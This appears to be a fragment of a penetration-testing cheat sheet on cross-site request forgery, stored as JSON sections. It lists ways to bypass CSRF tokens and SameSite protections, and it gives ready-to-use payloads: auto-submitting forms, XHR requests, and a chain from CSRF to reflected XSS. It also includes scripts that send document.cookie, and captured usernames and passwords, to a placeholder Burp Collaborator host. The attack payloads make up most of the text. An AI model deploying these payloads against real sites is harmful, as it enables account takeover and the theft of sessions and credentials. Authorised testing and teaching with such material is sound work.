    "sections": [
        {
            "heading": "Summary",
            "type": "hint",
            "variant": "info",
            "content": "Cross-site request forgery (also known as CSRF) is a web security vulnerability that allows an attacker to induce users to perform actions that they do not intend to perform.\n\n**3 conditions**:\n* A relevant action.\n* Cookie-based session handling.\n* No unpredictable request parameters.\n\n**How to find**:\n* Remove CSRF token from requests and/or put a blank space.\n* Change POST to GET.\n* Replace the CSRF token with a random value (for example 1).\n* Replace the CSRF token with a random token of the same restraints.\n* Extract token with HTML injection.\n* Use a CSRF token that has been used before.\n* Bypass regex.\n* Remove referer header.\n* Request a CSRF by executing the call manually and use that token for the request."
        },
        {
            "heading": "Approach",
            "type": "code_block",
            "content": [
                "# Methodology",
                "- Removing the token parameter entirely",
                "- Setting the token to a blank string",
                "- Changing the token to an invalid token of the same format",
                "- Using a different user's token",
                "- Put the parameters in the URL instead of POST body (and remove the token) and change the HTTP verb to GET",
                "- Testing every sensitive endpoint",
                "- Check whether the token might be guessed / cracked",
                "- Check whether new tokens are generated for every session, if not they may be a hash of something simple like the user's email address. If so you can craft your own valid tokens.",
                "- Try building the payload with multiple methods including a standard HTML form, multipart form, and XHR (Burp can help)"
            ]
        },
        {
            "heading": "Quick attacks",
            "type": "code_block",
            "content": [
                "# HTML GET",
                "<a href=\"http://vulnerable/endpoint?parameter=CSRFd\">Click</a>",
                "",
                "# HTML GET (no interaction)",
                "<img src=\"http://vulnerable/endpoint?parameter=CSRFd\">",
                "",
                "# HTML POST:",
                "<form action=\"http://vulnerable/endpoint\" method=\"POST\">",
                "<input name=\"parameter\" type=\"hidden\" value=\"CSRFd\" />",
                "<input type=\"submit\" value=\"Submit Request\" />",
                "</form>",
                "",
                "# HTML POST (no interaction)",
                "<form id=\"autosubmit\" action=\"http://vulnerable/endpoint\" method=\"POST\">",
                "<input name=\"parameter\" type=\"hidden\" value=\"CSRFd\" />",
                "<input type=\"submit\" value=\"Submit Request\" />",
                "</form>",
                "<script>",
                "document.getElementById(\"autosubmit\").submit();",
                "</script>",
                "",
                "# JSON GET:",
                "<script>",
                "var xhr = new XMLHttpRequest();",
                "xhr.open(\"GET\", \"http://vulnerable/endpoint\");",
                "xhr.send();",
                "</script>",
                "",
                "# JSON POST",
                "<script>",
                "var xhr = new XMLHttpRequest();",
                "xhr.open(\"POST\", \"http://vulnerable/endpoint\");",
                "xhr.setRequestHeader(\"Content-Type\", \"text/plain\");",
                "xhr.send('{\"role\":admin}');",
                "</script>"
            ]
        },
        {
            "heading": "Tools",
            "type": "code_block",
            "content": [
                "# XSRFProbe",
                "# https://github.com/0xInfection/XSRFProbe",
                "xsrfprobe --help",
                "",
                "# CSRFShark",
                "https://csrfshark.github.io/"
            ]
        },
        {
            "heading": "Example 1: Basic POST CSRF",
            "type": "code_block",
            "content": [
                "Vulnerable request example:",
                "__",
                "POST /email/change HTTP/1.1",
                "Host: vulnerable-website.com",
                "Content-Type: application/x-www-form-urlencoded",
                "Content-Length: 30",
                "Cookie: session=yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfE",
                "",
                "email=wiener@normal-user.com",
                "__",
                "",
                "HTML with attack:",
                "__",
                "<html>",
                "  <body>",
                "    <form action=\"https://vulnerable-website.com/email/change\" method=\"POST\">",
                "      <input type=\"hidden\" name=\"email\" value=\"pwned@evil-user.net\" />",
                "    </form>",
                "    <script>",
                "      document.forms[0].submit();",
                "    </script>",
                "  </body>",
                "</html>",
                "__"
            ]
        },
        {
            "heading": "Example 2: GET & SameSite Bypasses",
            "type": "code_block",
            "content": [
                "# Exploit CSRF in GET:",
                "<img src=\"https://vulnerable-website.com/email/change?email=pwned@evil-user.net\">",
                "",
                "# SameSite cookie property avoid the attack:",
                "   → Only from same site:",
                "    SetCookie: SessionId=sYMnfCUrAlmqVVZn9dqevxyFpKZt30NN; SameSite=Strict; ",
                "   → From other site only if GET and requested by click (Lax):    ",
                "    SetCookie: SessionId=sYMnfCUrAlmqVVZn9dqevxyFpKZt30NN; SameSite=Lax; ",
                "",
                "# Stealing Cookies (if no HttpOnly):",
                "<script>",
                "fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net', {",
                "method: 'POST',",
                "mode: 'no-cors',",
                "body:document.cookie",
                "});",
                "</script>",
                "",
                "# Credentials harvesting:",
                "<input name=username id=username>",
                "<input type=password name=password onchange=\"if(this.value.length)fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net',{",
                "method:'POST',",
                "mode: 'no-cors',",
                "body:username.value+':'+this.value",
                "});\">"
            ]
        },
        {
            "heading": "Json CSRF",
            "type": "code_block",
            "content": [
                "Requirements:",
                "1. The authentication mechanism should be cookie-based.",
                "2. No custom random token on the header or body (X-Auth-Token).",
                "3. No Same Origin Policy enforcement.",
                "",
                "Bypasses:",
                "• Change request method to GET; append body as query parameter.",
                "• Test request without Customized Token (X-Auth-Token) / headers.",
                "• Test request with exact same length but different token.",
                "",
                "If POST is not allowed, try method override:",
                "URL/param?_method=PUT",
                "",
                "PoC using text/plain to avoid preflight:",
                "<body onload='document.forms[0].submit()'>",
                "<form action=\"https://<vulnerable-url>?_method=PUT\" method=\"POST\" enctype=\"text/plain\">",
                "  <input type=\"text\" name='{\"username\":\"blob\",\"dummy\":\"' value='\"}'>",
                "  <input type=\"submit\" value=\"send\">",
                "</form>",
                "",
                "# Results in body: {\"username\":\"blob\", \"dummy\": \"=\"}"
            ]
        },
        {
            "heading": "CSRF Token Bypass",
            "type": "code_block",
            "content": [
                "# CSRF Tokens",
                "Unpredictable values validated by the server. If missing or invalid, the request is rejected.",
                "",
                "# Common Bypass Techniques:",
                "- Validation depends on method (e.g., token only checked on POST, not GET).",
                "- Validation depends on token presence (validation skipped if token parameter is removed).",
                "- CSRF not tied to user session (attacker uses their own valid token).",
                "- CSRF tied to a non-session cookie (attacker sets their own cookie/token pair).",
                "- CSRF token duplicated in cookie (validation only checks if they match).",
                "- Validation of Referer depends on header presence (skip by stripping Referer).",
                "- Circumvent Referer validation (if regex is weak, e.g., attackerdomain.com.target.com).",
                "",
                "# Token Manipulation:",
                "- Remove Anti-CSRF Token.",
                "- Spoof Token by changing a few bits.",
                "- Use the same token multiple times.",
                "- Weak cryptography/predictable tokens.",
                "- Steal token via XSS.",
                "- Convert POST to GET to bypass token check.",
                "",
                "# Other bypasses:",
                "1) Remove token & parameter.",
                "2) Pass blank parameter.",
                "3) Use token of same length.",
                "4) Use another user's valid token.",
                "5) Random long length token (aaaaaaaaa).",
                "6) Try decoding the token (Base64, etc.).",
                "7) Use only the static part of the token."
            ]
        },
        {
            "heading": "CSRF sample POC",
            "type": "code_block",
            "content": [
                "<html>",
                "<script>",
                "function jsonreq() {",
                "  var xmlhttp = new XMLHttpRequest();",
                "  xmlhttp.open(\"POST\",\"https://target.com/api/endpoint\", true);",
                "  xmlhttp.setRequestHeader(\"Content-Type\",\"text/plain\");",
                "  xmlhttp.withCredentials = true;",
                "  xmlhttp.send(JSON.stringify({\"test\":\"x\"}));",
                "}",
                "jsonreq();",
                "</script>",
                "</html>"
            ]
        },
        {
            "heading": "CSRF to reflected XSS",
            "type": "code_block",
            "content": [
                "<html>",
                "  <body>",
                "    <p>Please wait... ;)</p>",
                "    <script>",
                "let host = 'http://target.com'",
                "let alert_payload = '%3Cimg%2Fsrc%2Fonerror%3Dalert(1)%3E'",
                "",
                "function submitRequest() {",
                "  var req = new XMLHttpRequest();",
                "  req.open('POST', host + '/vulnerable-endpoint', true);",
                "  req.setRequestHeader(\"Accept\", \"*\\/*\");",
                "  req.withCredentials = true;",
                "  req.onreadystatechange = function () {",
                "    if (req.readyState === 4) {",
                "      executeXSS();",
                "    }",
                "  }",
                "  req.send('param=' + alert_payload);",
                "}",
                "",
                "function executeXSS() {",
                "  window.location.assign(host+'<URI with XSS>'+alert_payload);",
                "}",
                "",
                "submitRequest();",
                "    </script>",
                "  </body>",
                "</html>"
            ]
        },
